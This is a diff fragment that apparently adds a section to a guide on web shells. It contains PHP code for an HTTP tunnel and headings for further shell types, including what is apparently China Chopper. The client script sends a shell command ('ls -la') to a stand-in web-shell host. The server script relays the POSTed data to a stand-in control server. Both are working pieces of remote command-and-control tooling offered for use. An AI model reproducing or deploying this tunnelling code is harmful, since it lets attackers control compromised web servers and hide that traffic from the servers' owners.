@@ -64,9 +64,47 @@ if (isset($_POST['cmd'])) {
 
 2. Http tunnel
 
-- Code:
+- Client:
+
+```
+<?php
+$data = 'command=ls -la';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'http://webshell-server.com/shell.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+    'data' => $data
+]));
+$response = curl_exec($ch);
+curl_close($ch);
+echo $response;
+?>
+```
+
+- Server:
+
+```
+<?php
+$controlServer = 'http://control-server.com/tunnel';
+$apiKey = 'your-api.key';
+$data = $_POST['data'];
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $controlServer);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+    'data' => $data
+]));
+$response = curl_exec($ch);
+curl_close($ch);
+echo $response;
+?>
+```
 
 - Demo:
+
+
 
 3. Chooper
 
